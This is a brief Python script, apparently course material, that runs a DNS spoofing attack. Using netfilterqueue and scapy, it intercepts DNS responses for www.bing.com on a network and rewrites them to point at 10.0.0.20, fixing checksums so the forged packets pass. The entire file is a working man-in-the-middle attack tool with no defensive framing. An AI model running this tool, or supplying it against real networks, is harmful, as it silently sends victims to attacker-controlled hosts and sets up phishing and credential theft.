#!/usr/bin/env python

import netfilterqueue
# module that allow to access the queue from python
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("spoofing target ")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.0.20")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            packet.set_payload(str(scapy_packet))

    packet.accept()
    # packet.drop()


queue = netfilterqueue.NetfilterQueue()
# creating an instance of the netfilterqueue object and storing it in a variable called queue
queue.bind(0, process_packet)
# connect or bind this queue with the queue created previously
# (in the terminal , and we gonna create it here using subprocess module
# ( 0 ) is the queue number , ( process_packet ) is the call back function which
# is gonna be executed
queue.run()

